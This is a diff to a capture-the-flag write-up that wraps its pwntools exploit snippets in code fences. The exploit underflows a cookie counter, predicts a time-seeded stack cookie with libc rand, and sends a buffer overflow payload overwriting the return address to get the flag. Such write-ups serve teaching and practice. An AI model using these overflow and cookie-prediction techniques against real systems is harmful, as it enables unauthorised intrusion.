@@ -14,6 +14,7 @@ We dive into both the grandma loop and the io loop. The grandma loop turns out t
 
 This means that we can underflow the cookies we have and "wrap around" to the target value of the big number that we need to get to "win" by only buying. 2 out of the 3 purchasing options also end up generating cookies for you, so the most efficient choice is to improve grandma's baking rate (and not buy any grandmas). A quick calculation tells us that we need to buy the upgrade 51 times to underflow, so we create a python script to do this:
 
+```python
     #!/usr/bin/env python3
     
     from pwn import *
@@ -27,6 +28,7 @@ This means that we can underflow the cookies we have and "wrap around" to the ta
     
     p.recvuntil(b'Enter any key to refresh')
     p.sendline('4' * 51)
+```
 
 ***Overflow the buffer***
 
@@ -36,12 +38,14 @@ We trace the origin of stack_cookie using Ghidra and we find that stack_cookie i
 
 The final part of the script:
 
+```python
     ct_libc.srand(t)
     stackcookie = ct_libc.rand()
     
     payload = b"A" * 28 + p32(stackcookie) + b"A" * 8 + p64(0x0000000000400e9b)
     p.send(payload)
     p.interactive()
+```
 
 When we run the script we get the flag. Hooray!
 
